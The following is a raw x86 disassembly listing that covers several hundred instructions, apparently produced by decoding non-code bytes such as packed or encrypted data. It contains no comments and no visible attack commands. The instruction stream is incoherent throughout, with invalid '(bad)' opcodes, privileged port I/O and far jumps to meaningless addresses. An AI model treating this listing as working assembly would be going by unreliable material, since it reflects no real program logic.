  419474:	bt     edx,edi
  419477:	das    
  419478:	loopne 0x4194f4
  41947a:	call   0x2b7:0x339c2f36
  419481:	add    cl,BYTE PTR [edi]
  419483:	push   edx
  419484:	mov    edx,0x9bea478b
  419489:	lods   eax,DWORD PTR ds:[esi]
  41948a:	or     DWORD PTR [edi+edx*1-0x77825253],eax
  419491:	pop    ds
  419492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419493:	mov    al,ds:0x41f61cde
  419498:	(bad)  
  419499:	out    0xd1,al
  41949b:	outs   dx,DWORD PTR ds:[esi]
  41949c:	jo     0x419492
  41949e:	repz dec ebx
  4194a0:	jbe    0x419474
  4194a2:	clc    
  4194a3:	aam    0x62
  4194a5:	ss in  al,0x89
  4194a8:	and    ecx,esi
  4194aa:	fs xchg ecx,eax
  4194ac:	mov    ?,WORD PTR gs:[eax-0x77]
  4194b0:	cmp    DWORD PTR [ebx+eiz*4-0x2ee5d8de],edi
  4194b7:	pop    eax
  4194b8:	fsub   DWORD PTR [eax+0x7d46f39f]
  4194be:	xchg   ecx,eax
  4194bf:	add    DWORD PTR [ecx],eax
  4194c1:	fs out 0x9c,al
  4194c4:	mov    al,0x12
  4194c6:	daa    
  4194c7:	push   eax
  4194c8:	js     0x4194db
  4194ca:	enter  0x5733,0x5b
  4194ce:	popa   
  4194cf:	cmp    eax,0x22c59683
  4194d4:	cmp    al,0x43
  4194d6:	inc    ecx
  4194d7:	jmp    0xbf74:0x43f2c92d
  4194de:	test   ah,bl
  4194e0:	std    
  4194e1:	push   cs
  4194e2:	dec    edx
  4194e3:	test   BYTE PTR [edx],bh
  4194e5:	mov    ebx,0xbb9301c9
  4194ea:	lock das 
  4194ec:	xchg   edx,eax
  4194ed:	mov    edx,DWORD PTR ds:0xc4767c4d
  4194f3:	into   
  4194f4:	je     0x4194ae
  4194f6:	mov    ebx,0x8da29d7b
  4194fb:	ss push cs
  4194fd:	jg     0x4194de
  4194ff:	xchg   ecx,eax
  419500:	(bad)  
  419501:	mov    esp,0x3eb13742
  419506:	or     al,0xab
  419508:	cmp    BYTE PTR [edx+0x2ed2a9a0],0xb1
  41950f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419510:	sar    DWORD PTR [edx+0x163608d2],0x9f
  419517:	sbb    DWORD PTR [edx+0x862556a],ebx
  41951d:	dec    ecx
  41951e:	jle    0x41958e
  419520:	and    edi,ebp
  419522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419523:	ja     0x4194b4
  419525:	push   0x8505c5e6
  41952a:	push   ebx
  41952b:	jns    0x4194c2
  41952d:	push   0x4667f296
  419532:	inc    esp
  419533:	icebp  
  419534:	call   0x558e:0xb817b356
  41953b:	outs   dx,BYTE PTR ds:[esi]
  41953c:	les    esi,FWORD PTR [ebx]
  41953e:	in     al,0x4a
  419540:	jnp    0x4195c1
  419542:	jo     0x4194da
  419544:	into   
  419545:	dec    eax
  419546:	inc    esi
  419547:	outs   dx,DWORD PTR ds:[esi]
  419548:	pop    ebx
  419549:	fist   WORD PTR [ebp-0x2]
  41954c:	clc    
  41954d:	pushf  
  41954e:	xor    DWORD PTR [esp+edi*2],ebx
  419551:	retf   
  419552:	icebp  
  419553:	mov    ah,0xea
  419555:	xor    eax,0x4f2107e1
  41955a:	aaa    
  41955b:	push   edx
  41955c:	data16 cmc 
  41955e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41955f:	or     al,0x52
  419561:	aad    0x18
  419563:	adc    al,BYTE PTR [esi+0x3b]
  419566:	daa    
  419567:	dec    eax
  419568:	xchg   esi,eax
  419569:	and    BYTE PTR [esi+0x5c],ch
  41956c:	jbe    0x419521
  41956e:	pop    ecx
  41956f:	mov    ebp,0x2c99eafd
  419574:	in     al,dx
  419575:	out    dx,al
  419576:	push   0xffffffaf
  419578:	or     al,0xff
  41957a:	or     ecx,eax
  41957c:	test   BYTE PTR [esi+0x7566f196],ch
  419582:	das    
  419583:	inc    ebx
  419584:	xor    eax,0x3f56272b
  419589:	mov    cl,0xd
  41958b:	addr16 sub ebx,edx
  41958e:	add    eax,0xa93ffe2f
  419593:	call   0xe03d:0xa09bed7b
  41959a:	add    eax,0x2935ff1c
  41959f:	inc    edi
  4195a0:	scas   eax,DWORD PTR es:[edi]
  4195a1:	add    BYTE PTR ds:0xf3207b0,0x33
  4195a8:	hlt    
  4195a9:	jle    0x41952b
  4195ab:	jg     0x41956c
  4195ad:	sub    DWORD PTR [ebx-0x12f5bd1c],edi
  4195b3:	cmp    bh,0xeb
  4195b6:	sahf   
  4195b7:	jg     0x4195eb
  4195b9:	sub    al,0x34
  4195bb:	mov    dl,0xc6
  4195bd:	js     0x419542
  4195bf:	in     al,0x1a
  4195c1:	jg     0x41963a
  4195c3:	pushf  
  4195c4:	mov    ecx,DWORD PTR [edi]
  4195c6:	xchg   edx,eax
  4195c7:	dec    ebx
  4195c8:	or     eax,0x46a1e1df
  4195cd:	fadd   QWORD PTR [edx-0x7e]
  4195d0:	xchg   ebx,eax
  4195d1:	jle    0x4195d2
  4195d3:	push   esp
  4195d4:	push   esi
  4195d5:	es sub eax,0x95c2a84c
  4195db:	stos   DWORD PTR es:[edi],eax
  4195dc:	aaa    
  4195dd:	jmp    0x2a10ebd4
  4195e2:	ins    DWORD PTR es:[edi],dx
  4195e3:	mov    dl,0x28
  4195e5:	ins    DWORD PTR es:[edi],dx
  4195e6:	(bad)  
  4195e7:	sar    BYTE PTR [edi-0x34],cl
  4195ea:	outs   dx,DWORD PTR ds:[esi]
  4195eb:	dec    esi
  4195ec:	arpl   WORD PTR [ebx],cx
  4195ee:	idiv   BYTE PTR [ecx]
  4195f0:	clc    
  4195f1:	mov    esp,0x96c4ee16
  4195f6:	(bad)  [eax]
  4195f8:	out    0x3,eax
  4195fa:	or     DWORD PTR ss:[ebx+eiz*2],eax
  4195fe:	push   ebx
  4195ff:	stos   DWORD PTR es:[edi],eax
  419600:	cmp    edi,DWORD PTR [edi+eax*4+0x35]
  419604:	loope  0x419682
  419606:	jb     0x4195be
  419608:	sbb    al,0xa
  41960a:	popa   
  41960b:	jae    0x41961e
  41960d:	pusha  
  41960e:	cli    
  41960f:	cwde   
  419610:	and    edi,DWORD PTR [ebx]
  419612:	sub    BYTE PTR [ebx],ch
  419614:	xchg   edi,eax
  419615:	xor    esi,0x7601b675
  41961b:	nop
  41961c:	pop    edi
  41961d:	test   BYTE PTR [eax+0x61],bh
  419620:	fisttp WORD PTR cs:[eax]
  419623:	sub    al,0x89
  419625:	push   0x3c892e51
  41962a:	mov    ecx,0xff11981d
  41962f:	cmp    al,0xab
  419631:	add    DWORD PTR [edi+0x1a],ebx
  419634:	imul   ebp,DWORD PTR [edx],0x53
  419637:	(bad)
  41963a:	mov    dl,0xb1
  41963c:	lds    edx,FWORD PTR [esi]
  41963e:	popa   
  41963f:	daa    
  419640:	push   esp
  419641:	inc    edi
  419642:	test   al,0xa0
  419644:	adc    BYTE PTR [ebp-0x1a],0x24
  419648:	or     ch,BYTE PTR [ebx+0x36]
  41964b:	ss pop ss
  41964d:	xchg   esi,eax
  41964e:	jmp    0x4195d5
  419650:	shl    BYTE PTR [esi+0x5c],cl
  419653:	into   
  419654:	(bad)  
  419655:	outs   dx,BYTE PTR ds:[esi]
  419656:	push   edx
  419657:	sub    BYTE PTR [edx+eax*4+0x26b74577],ch
  41965e:	mov    dh,dh
  419660:	xor    DWORD PTR [ebp+0x37ebad19],0xffffff88
  419667:	adc    eax,0x8912f1ed
  41966c:	stos   BYTE PTR es:[edi],al
  41966d:	xchg   ebx,eax
  41966e:	and    DWORD PTR [ebp-0x2f],edi
  419671:	leave  
  419672:	pop    esp
  419673:	push   ss
  419674:	lock scas eax,DWORD PTR es:[edi]
  419676:	imul   edi,ecx,0xffffffe6
  419679:	lds    ecx,FWORD PTR [ebx]
  41967b:	mov    ecx,0xba19c593
  419680:	in     eax,dx
  419681:	or     edx,DWORD PTR [ecx+0x1225688]
  419687:	scas   eax,DWORD PTR es:[edi]
  419688:	ins    BYTE PTR es:[edi],dx
  419689:	test   bh,ah
  41968b:	push   0x6b24502e
  419690:	push   ebx
  419691:	sbb    DWORD PTR [edx+0x22018b91],esp
  419697:	pop    ss
  419698:	shl    BYTE PTR [edx],cl
  41969a:	mov    ah,0x30
  41969c:	lods   eax,DWORD PTR ds:[esi]
  41969d:	rcl    DWORD PTR [ebp-0x2e6d944f],cl
  4196a3:	retf   0xdb00
  4196a6:	mov    eax,0x8b4ec519
  4196ab:	(bad)  
  4196ac:	jbe    0x4196a3
  4196ae:	add    BYTE PTR ds:0xdd96b95e,0xa3
  4196b5:	add    BYTE PTR [esi+ebx*4-0x42],bl
  4196b9:	and    eax,0xe6fd25f
  4196be:	dec    edi
  4196bf:	push   esi
  4196c0:	xchg   edi,eax
  4196c1:	and    dh,BYTE PTR [edi+0x4d]
  4196c4:	cmc    
  4196c5:	fild   DWORD PTR [esi]
  4196c7:	popa   
  4196c8:	cmp    eax,0x3964b15d
  4196cd:	aad    0xca
  4196cf:	lods   eax,DWORD PTR ds:[esi]
  4196d0:	cmp    DWORD PTR [eax],0xffffffda
  4196d3:	in     al,dx
  4196d4:	mov    al,0x64
  4196d6:	mov    esi,0x37d9c736
  4196db:	int3   
  4196dc:	push   esp
  4196dd:	or     ah,BYTE PTR [edi]
  4196df:	(bad)  
  4196e0:	xchg   ecx,eax
  4196e1:	jecxz  0x419759
  4196e3:	mov    eax,ds:0x7c91d4ed
  4196e8:	mov    edx,0x215b5f0a
  4196ed:	inc    edi
  4196ee:	mov    ds:0xf1db74e6,eax
  4196f3:	and    ebx,DWORD PTR [edx-0x13]
  4196f6:	test   BYTE PTR [edi+0x65],ch
  4196f9:	fidivr DWORD PTR ds:0x73e8454a
  4196ff:	imul   ebx,DWORD PTR [ebx+0x54aaf1f],0x4d
  419706:	mov    eax,ds:0xc255c603
  41970b:	data16 adc BYTE PTR [edi+0x30],ch
  41970f:	mov    al,0x9b
  419711:	stos   DWORD PTR es:[edi],eax
  419712:	stos   BYTE PTR es:[edi],al
  419713:	add    eax,0x42aec285
  419718:	sub    BYTE PTR [edi-0x506c2b89],0xd0
  41971f:	ss mov bl,0x49
  419722:	push   0x8d67d442
  419727:	sub    ebx,DWORD PTR [bx+si]
  41972a:	inc    edi
  41972b:	pop    ss
  41972c:	sbb    esi,DWORD PTR [eax+eax*1]
  41972f:	sub    bh,BYTE PTR [edx-0x30]
  419732:	repz aam 0x78
  419735:	aad    0x4b
  419737:	std    
  419738:	movups xmm6,XMMWORD PTR [ecx-0x7f48f163]
  41973f:	rcl    BYTE PTR [edi+0x1cf665b2],1
  419745:	in     eax,0x70
  419747:	outs   dx,DWORD PTR ds:[esi]
  419748:	mov    al,0xb2
  41974a:	pop    ds
  41974b:	shl    BYTE PTR [ebx+esi*2-0x38],cl
  41974f:	test   cl,bl
  419751:	xchg   esp,eax
  419752:	xlat   BYTE PTR ds:[ebx]
  419753:	sbb    eax,esp
  419755:	cmp    eax,DWORD PTR [edi+edx*1+0x29932dae]
  41975c:	leave  
  41975d:	cmp    ecx,DWORD PTR [ecx-0x26]
  419760:	repz (bad) 
  419762:	stc    
  419763:	jne    0x419767
  419765:	push   esi
  419766:	ds (bad) 
  419769:	jp     0x4197ab
  41976b:	mov    dh,0xa2
  41976d:	sti    
  41976e:	pop    edx
  41976f:	add    eax,0x6df17280
  419774:	xor    al,bh
  419776:	pop    eax
  419777:	sub    esi,DWORD PTR [ebx-0x53]
  41977a:	icebp  
  41977b:	mov    dh,0x31
  41977d:	stos   BYTE PTR es:[edi],al
  41977e:	ss (bad) 
  419780:	jg     0x419766
  419782:	sub    ah,BYTE PTR [ecx+0x4646740e]
  419788:	dec    ebp
  419789:	or     dl,BYTE PTR [ebx]
  41978b:	inc    edi
  41978c:	mov    bl,0xa3
  41978e:	xor    BYTE PTR ds:[esi],dl
  419791:	jecxz  0x4197d0
  419793:	adc    BYTE PTR [ecx+0x211ad7a8],dh
  419799:	or     ebp,DWORD PTR [esi+0x6f3cd51f]
  41979f:	and    DWORD PTR [edx],eax
  4197a1:	cmp    eax,0x28ed5642
  4197a6:	in     al,0x21
  4197a8:	(bad)  
  4197a9:	iret   
  4197aa:	xor    DWORD PTR [ecx+0x26],esi
  4197ad:	(bad)  
  4197ae:	adc    ebx,DWORD PTR [ebp-0x2e]
  4197b1:	adc    eax,0x21d342e7
  4197b6:	mov    BYTE PTR [eax+0x328266e5],ch
  4197bc:	adc    eax,0x3b7c187
  4197c1:	into   
  4197c2:	daa    
  4197c3:	jo     0x4197e9
  4197c5:	adc    DWORD PTR [ebp-0x48],edx
  4197c8:	bound  esi,QWORD PTR [ecx]
  4197ca:	mov    bh,0x40
  4197cc:	sub    ecx,DWORD PTR [ebx-0x779a89d0]
  4197d2:	push   ebx
  4197d3:	inc    edx
  4197d4:	jl     0x4197f5
  4197d6:	xchg   esi,eax
  4197d7:	in     al,0x95
  4197d9:	ins    DWORD PTR es:[edi],dx
  4197da:	inc    esp
  4197db:	in     eax,dx
  4197dc:	aad    0xc0
  4197de:	or     cl,ah
  4197e0:	sub    bh,BYTE PTR [edx-0x13]
  4197e3:	adc    eax,0xbf71439d
  4197e8:	mov    edi,0xf175263b
  4197ed:	dec    esi
  4197ee:	lods   eax,DWORD PTR ds:[esi]
  4197ef:	pusha  
  4197f0:	mov    ecx,0xe09a29f3
  4197f5:	add    eax,0x2b8f67a5
  4197fa:	sub    esi,ebx
  4197fc:	test   al,0xbd
  4197fe:	fnsave [ebx+0x3daa37d3]
  419804:	outs   dx,BYTE PTR ds:[esi]
  419805:	shr    BYTE PTR [ebx-0x5e1d20cf],cl
  41980b:	leave  
  41980c:	lds    edx,FWORD PTR [edx+0x3fcdd9d5]
  419812:	fucomi st,st(0)
  419814:	pop    ebx
  419815:	pop    ecx
  419816:	jbe    0x419861
  419818:	shr    eax,cl
  41981a:	sar    BYTE PTR [esi-0x10],cl
  41981d:	dec    ebx
  41981e:	or     al,0x3a
  419820:	xchg   edi,eax
  419821:	cmp    eax,ebx
  419823:	sbb    cl,BYTE PTR [edx]
  419825:	sub    al,0x3b
  419827:	adc    BYTE PTR [edx-0x24],al
  41982a:	adc    DWORD PTR [ebp-0x2f],esp
  41982d:	dec    edi
  41982e:	popf   
  41982f:	jnp    0x419854
  419831:	scas   al,BYTE PTR es:[edi]
  419832:	inc    edx
  419833:	int3   
  419834:	outs   dx,BYTE PTR ds:[esi]
  419835:	int3   
  419836:	pop    ebp
  419837:	sub    dh,dl
  419839:	(bad)  
  41983a:	add    DWORD PTR fs:[eax+0x71d4cbd9],ecx
  419841:	inc    ebp
  419842:	fadd   DWORD PTR [esi]
  419844:	sbb    ecx,DWORD PTR [ebx-0x7f6355a8]
  41984a:	mov    ds:0xe173d2ef,eax
  41984f:	cmp    DWORD PTR [esi],esp
  419851:	ficomp DWORD PTR [edi]
  419853:	adc    al,0xee
  419855:	outs   dx,DWORD PTR ds:[esi]
  419856:	nop
  419857:	cld    
  419858:	fsubr  DWORD PTR [edx-0x6ee17d6]
  41985e:	pop    edx
  41985f:	sbb    BYTE PTR [edi],dh
  419861:	imul   edx,DWORD PTR [ebx+0x7b],0x70
  419865:	cmp    BYTE PTR [esi-0x4502fd9e],bh
  41986b:	rcr    edi,1
  41986d:	mov    edi,0x2dd9cac
  419872:	(bad)  
  419874:	mov    al,0xa
  419876:	xor    BYTE PTR [ecx+ebp*1+0x18],0x14
  41987b:	sub    BYTE PTR [eax+ebp*8],ch
  41987e:	out    dx,eax
  41987f:	fisttp QWORD PTR [ecx+0x244be126]
  419885:	add    BYTE PTR [ecx],al
  419887:	or     al,BYTE PTR [ecx+0x4023756b]
  41988d:	stc    
  41988e:	aam    0x31
  419890:	lock stos BYTE PTR es:[edi],al
  419892:	aas    
  419893:	xchg   esp,eax
  419894:	lods   al,BYTE PTR ds:[esi]
  419895:	pop    esi
  419896:	mov    bh,0x8c
  419898:	test   eax,0x7065960
  41989e:	leave  
  41989f:	bound  eax,QWORD PTR ds:0x1d9fe14d
  4198a5:	fstp   TBYTE PTR [ecx-0x2e]
  4198a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198a9:	hlt    
  4198aa:	push   ds
  4198ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198ac:	and    DWORD PTR [eax*4-0x237e400e],edx
  4198b3:	int3   
  4198b4:	xchg   esp,eax
  4198b5:	jo     0x4198f1
  4198b7:	add    eax,DWORD PTR [ecx]
  4198b9:	add    edx,DWORD PTR [esp-0x3b]
  4198bd:	ret    
  4198be:	push   0xb561a471
  4198c3:	stc    
  4198c4:	ins    DWORD PTR es:[edi],dx
  4198c5:	inc    edi
  4198c6:	inc    ecx
  4198c7:	test   bh,ah
  4198c9:	cmp    DWORD PTR [esi-0x6d],edi
  4198cc:	pop    ebp
  4198cd:	call   0xcb89ef59
  4198d2:	cdq    
  4198d3:	adc    DWORD PTR [ebp+esi*4+0x73],0x41
  4198d8:	je     0x4198d8
  4198da:	cmc    
  4198db:	fs sbb al,0x85
  4198de:	out    0xa6,eax
  4198e0:	aaa    
  4198e1:	dec    ebp
  4198e2:	sub    eax,0x51d013da
  4198e7:	leave  
  4198e8:	inc    ecx
  4198e9:	xor    BYTE PTR [ecx-0x2e],0x62
  4198ed:	mov    edi,0x44d75e95
  4198f2:	sbb    DWORD PTR [ecx+ebp*8-0x34a3c9d0],ecx
  4198f9:	add    ebx,ebx
  4198fb:	or     ch,BYTE PTR [edi]
  4198fd:	adc    edi,DWORD PTR [edi-0x1ac8384d]
  419903:	loope  0x4198f1
  419905:	mov    ds:0xbd68fe6e,al
  41990a:	int    0x85
  41990c:	int    0x9
  41990e:	xor    cl,cl
  419910:	sbb    ch,BYTE PTR [edx+eiz*8]
  419913:	xchg   ebx,eax
  419914:	fld    QWORD PTR [ebp-0x571cffb2]
  41991a:	pop    ebp
  41991b:	jp     0x41998a
  41991d:	mov    eax,ds:0x5ca4b57d
  419922:	leave  
  419923:	test   al,0x1e
  419925:	mov    esp,0x28865de2
  41992a:	jno    0x419929
  41992c:	test   eax,0xc72dab4e
  419931:	xchg   edi,eax
  419932:	sahf   
  419933:	sub    DWORD PTR [edx+0x4b],esp
  419936:	add    eax,0x26d157e3
  41993b:	pop    edi
  41993c:	push   0x55
  41993e:	sbb    bl,bh
  419940:	xor    al,BYTE PTR [ebx+0x29]
  419943:	cmp    al,al
  419945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419946:	daa    
  419947:	sub    cl,dh
  419949:	std    
  41994a:	clc    
  41994b:	xchg   ebx,eax
  41994c:	jge    0x419942
  41994e:	(bad)  
  419950:	test   DWORD PTR [ecx+0x3b6dd3a6],eax
  419956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419957:	mul    DWORD PTR [eax*4+0x5e648c23]
  41995e:	fwait
  41995f:	test   al,0x4c
  419961:	mov    dh,0x7
  419963:	fwait
  419964:	jo     0x41990e
  419966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419967:	retf   
  419968:	push   ss
  419969:	frstor [ecx-0x58]
  41996c:	enter  0x71b4,0x5e
  419970:	xor    ebp,ebp
  419972:	int    0x8a
  419974:	aaa    
  419975:	jbe    0x4199e6
  419977:	xor    DWORD PTR [ecx-0x1e],0xffffffe0
  41997b:	hlt    
  41997c:	xor    ebx,DWORD PTR [ebx-0x7d4607d0]
  419982:	jl     0x419972
  419984:	repnz out dx,eax
  419986:	push   ebp
  419987:	mov    ebp,0xbd5a9648
  41998c:	push   cs
  41998d:	dec    ecx
  41998e:	lods   al,BYTE PTR ds:[esi]
  41998f:	adc    DWORD PTR [edi-0x6d31880b],esi
  419995:	in     al,dx
  419996:	pop    ds
  419997:	inc    ebx
  419998:	mov    ah,0x5
  41999a:	into   
  41999b:	not    dl
  41999d:	push   ds
  41999e:	mul    dl
  4199a0:	scas   al,BYTE PTR es:[edi]
  4199a1:	test   eax,0xd6b8893b
  4199a6:	aad    0x2
  4199a8:	rcr    edi,cl
  4199aa:	into   
  4199ab:	add    dh,bh
  4199ad:	imul   BYTE PTR [ecx+0x606e35c3]
  4199b3:	mov    al,BYTE PTR [eax-0x3]
  4199b6:	mov    ebp,0xb8c4c83a
  4199bb:	mov    ch,0x2d
  4199bd:	sbb    eax,ecx
  4199bf:	or     BYTE PTR [ebp*8-0x609239c0],ch
  4199c6:	lahf   
  4199c7:	shl    BYTE PTR [ecx-0x2b38b838],1
  4199cd:	xchg   ecx,eax
  4199ce:	mov    ebp,0xe262b609
  4199d3:	lods   eax,DWORD PTR ds:[esi]
  4199d4:	in     al,dx
  4199d5:	stos   DWORD PTR es:[edi],eax
  4199d6:	lea    ecx,[ecx-0x17]
  4199d9:	or     BYTE PTR [esi-0x5],ch
  4199dc:	test   BYTE PTR [esi-0x5cfd5b71],cl
  4199e2:	mov    ebp,0x1bb7c141
  4199e7:	xchg   ebp,eax
  4199e8:	icebp  
  4199e9:	cwde   
  4199ea:	sbb    ah,dh
  4199ec:	mov    edx,eax
  4199ee:	in     al,0xba
  4199f0:	test   eax,0x9fa22002
  4199f5:	(bad)  
  4199f6:	adc    ah,dl
  4199f8:	adc    esi,ebp
  4199fa:	mov    al,0x68
  4199fc:	dec    ebp
  4199fd:	and    edi,DWORD PTR [ecx+0x37b8a59d]
  419a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a04:	fcomp  QWORD PTR [esi-0x7720d42f]
  419a0a:	cmp    bh,BYTE PTR [ebx+ebx*2-0x7b65e39]
  419a11:	inc    ecx
  419a12:	add    al,0x8d
  419a14:	outs   dx,DWORD PTR ds:[esi]
  419a15:	scas   eax,DWORD PTR es:[edi]
  419a16:	(bad)  
  419a17:	int3   
  419a18:	std    
  419a19:	fadd   QWORD PTR [edx+ebp*8]
  419a1c:	mov    dh,0xf5
  419a1e:	mov    ebp,0x1970a52c
  419a23:	push   esi
  419a24:	push   es
  419a25:	mov    ecx,0xcb05eeb
  419a2a:	adc    DWORD PTR [ebp+0x6a11b96e],esi
  419a30:	or     eax,0x238f641e
  419a35:	or     al,0x9a
  419a37:	sbb    al,0xf6
  419a39:	or     al,0x85
  419a3b:	jbe    0x4199f7
  419a3d:	ins    DWORD PTR es:[edi],dx
  419a3e:	pop    es
  419a3f:	cdq    
  419a40:	mov    ah,0x2b
  419a42:	jns    0x419a7d
  419a44:	out    0xd9,eax
  419a46:	in     eax,dx
  419a47:	loope  0x419a47
  419a49:	and    BYTE PTR [esi-0x22],cl
  419a4c:	fstp   TBYTE PTR [edi-0x46]
  419a4f:	das    
  419a50:	bound  edx,QWORD PTR [edi-0x7f9c3d06]
  419a56:	arpl   si,bx
  419a58:	and    BYTE PTR [eax+0x4208a1db],al
  419a5e:	inc    eax
  419a5f:	push   0x65
  419a61:	mov    ecx,0x8cd43fa8
  419a66:	in     eax,dx
  419a67:	sub    BYTE PTR [ecx-0x36],cl
  419a6a:	pop    esp
  419a6b:	jne    0x419ae6
  419a6d:	stc    
  419a6e:	in     al,dx
  419a6f:	lods   eax,DWORD PTR ds:[esi]
  419a70:	jne    0x419a06
  419a72:	stos   DWORD PTR es:[edi],eax
  419a73:	loopne 0x419a47
  419a75:	inc    edi
  419a76:	add    BYTE PTR [ebx],ch
  419a78:	cs cmc 
  419a7a:	lods   eax,DWORD PTR ds:[esi]
  419a7b:	sub    edi,DWORD PTR [ecx+0x2fa77a08]
  419a81:	rcl    DWORD PTR [ecx+0x78c9188e],1
  419a87:	xor    esp,esp
  419a89:	jmp    0x74a3:0x3b6c2914
  419a90:	cdq    
  419a91:	mov    cl,0xa9
  419a93:	jg     0x419a4b
  419a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a96:	jno    0x419a61
  419a98:	mov    al,ds:0x69c530b0
  419a9d:	pushf  
  419a9e:	xchg   ebx,eax
  419a9f:	rol    DWORD PTR [esi],0x29
  419aa2:	or     al,0xf3
  419aa4:	(bad)  
  419aa5:	adc    DWORD PTR cs:[edx+0x5d],ebp
  419aa9:	xlat   BYTE PTR ds:[ebx]
  419aaa:	pop    eax
  419aab:	fadd   QWORD PTR [edi+0x518fc77d]
  419ab1:	xchg   esp,eax
  419ab2:	aad    0xb5
  419ab4:	repnz adc eax,0x15d11392
  419aba:	xchg   ecx,eax
  419abb:	leave  
  419abc:	ja     0x419aac
  419abe:	shr    DWORD PTR [eax+0x7f],1
  419ac1:	jno    0x419aa6
  419ac3:	scas   al,BYTE PTR es:[edi]
  419ac4:	and    DWORD PTR [edx-0x4ae88822],esi
  419aca:	shl    DWORD PTR [esi],0xf9
  419acd:	jmp    0x7f46:0x584a6051
  419ad4:	pop    edx
  419ad5:	inc    eax
  419ad6:	pop    es
  419ad7:	lods   al,BYTE PTR ds:[esi]
  419ad8:	loopne 0x419b4a
  419ada:	jmp    0x419b5b
  419adc:	dec    ebx
  419add:	mov    ah,0xc6
  419adf:	jno    0x419b0b
  419ae1:	int    0x1b
  419ae3:	push   edx
  419ae4:	and    eax,DWORD PTR [esi-0x5e0e8426]
  419aea:	jmp    0xdeff8360
  419aef:	(bad)  
  419af0:	clc    
  419af1:	xor    ebp,0xffffffaa
  419af4:	push   ds
  419af5:	aaa    
  419af6:	loope  0x419ae4
  419af8:	dec    ebp
  419af9:	pop    es
  419afa:	push   ss
  419afb:	lods   eax,DWORD PTR ds:[esi]
  419afc:	add    eax,edi
  419afe:	dec    edi
  419aff:	clc    
  419b00:	and    DWORD PTR [ebp+eiz*8-0x33],edi
  419b04:	(bad)
  419b07:	loop   0x419b18
  419b09:	dec    eax
  419b0a:	jae    0x419b7d
  419b0c:	pop    esp
  419b0d:	xchg   edi,eax
  419b0e:	inc    edi
  419b0f:	out    0x20,al
  419b11:	js     0x419ad1
  419b13:	pop    ebx
  419b14:	sbb    BYTE PTR [ebx+edi*8],0x30
  419b18:	dec    eax
  419b19:	je     0x419ac5
  419b1b:	mov    ?,WORD PTR [eax+0x6d]
  419b1e:	mov    dl,0x4d
  419b20:	xchg   dl,cl
  419b22:	lea    edx,[eax-0x9]
  419b25:	jp     0x419af8
  419b27:	adc    ch,dh
  419b29:	gs cwde 
  419b2b:	out    dx,eax
  419b2c:	fadd   st,st(3)
  419b2e:	push   ebx
  419b2f:	lea    ebp,[esi+0x55e6b466]
  419b35:	jecxz  0x419af5
  419b37:	push   eax
  419b38:	cmp    bl,ch
  419b3a:	mov    esp,0x7db59c41
  419b3f:	ret    
  419b40:	fwait
  419b41:	dec    esi
  419b42:	js     0x419bb2
  419b44:	jo     0x419b16
  419b46:	adc    dl,0x7d
  419b49:	inc    edi
  419b4a:	gs pop ebx
  419b4c:	fadd   st(2),st
  419b4e:	push   edi
  419b4f:	out    dx,eax
  419b50:	or     esp,DWORD PTR [edi+ebp*2]
  419b53:	xchg   edx,eax
  419b54:	mov    ds:0x822bac18,al
  419b59:	add    al,ch
  419b5b:	dec    edx
  419b5c:	jl     0x419b81
  419b5e:	aad    0x75
  419b60:	imul   edx,DWORD PTR [ebx],0xffffffd7
  419b63:	mov    ds:0xfa2ba930,eax
  419b68:	xchg   ebp,esi
  419b6a:	test   al,0xf4
  419b6c:	and    DWORD PTR ds:0xfe9d2c58,ebp
  419b72:	mov    al,ds:0x94e857f2
  419b77:	pop    ss
  419b78:	mov    dl,0xad
  419b7a:	push   es
  419b7b:	mov    al,0xef
  419b7d:	dec    esi
  419b7e:	and    eax,DWORD PTR [ebp+edi*8-0x21]
  419b82:	daa    
  419b83:	rol    BYTE PTR [esi-0x21408be2],0x21
  419b8a:	test   al,0x9c
  419b8c:	(bad)  
  419b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b8e:	sub    eax,DWORD PTR [ebx-0x3ae2dae9]
  419b94:	push   esi
  419b95:	mov    al,0x7c
  419b97:	ret    0x59a9
  419b9a:	gs sub al,dh
  419b9d:	out    dx,al
  419b9e:	sar    DWORD PTR [edi-0x5b],0x27
  419ba2:	fld    QWORD PTR ds:[edi]
  419ba5:	pop    es
  419ba6:	push   ss
  419ba7:	jae    0x419b8f
  419ba9:	imul   eax,DWORD PTR [edx],0x9b776e9a
  419baf:	ret    0x4f05
  419bb2:	xlat   BYTE PTR ds:[ebx]
  419bb3:	dec    ebp
  419bb4:	cmp    ah,dl
  419bb6:	mov    DWORD PTR ss:0xab77ef5f,ecx
  419bbd:	cwde   
  419bbe:	pop    ecx
  419bbf:	call   0x6504dd22
  419bc4:	adc    al,0x6
  419bc6:	outs   dx,DWORD PTR ds:[esi]
  419bc7:	jns    0x419b78
  419bc9:	std    
  419bca:	dec    edx
  419bcb:	xchg   ebx,eax
  419bcc:	xor    ebx,DWORD PTR [edi+0x1b]
  419bcf:	adc    al,0x7
  419bd1:	dec    esi
  419bd2:	fcmovbe st,st(3)
  419bd4:	enter  0x4a4,0x0
  419bd8:	xor    al,0xa8
  419bda:	xchg   ecx,eax
  419bdb:	pop    eax
  419bdc:	aas    
  419bdd:	mov    ebx,0x22d08355
  419be2:	dec    ebx
  419be3:	out    0x28,al
  419be5:	leave  
  419be6:	inc    esp
  419be7:	dec    esi
  419be8:	fstp   QWORD PTR [esp+esi*1-0x17cfcb53]
  419bef:	mov    ecx,0x9ff300c2
  419bf4:	and    DWORD PTR ds:0x912061b0,0x83bb2c82
  419bfe:	jg     0x419c16
  419c00:	ins    DWORD PTR es:[edi],dx
  419c01:	mov    DWORD PTR [ebx+0x51],ebx
  419c04:	lods   al,BYTE PTR ds:[esi]
  419c05:	lock mov cl,0xd1
  419c08:	dec    ebx
  419c09:	inc    ebp
  419c0a:	jb     0x419bdd
  419c0c:	ss push es
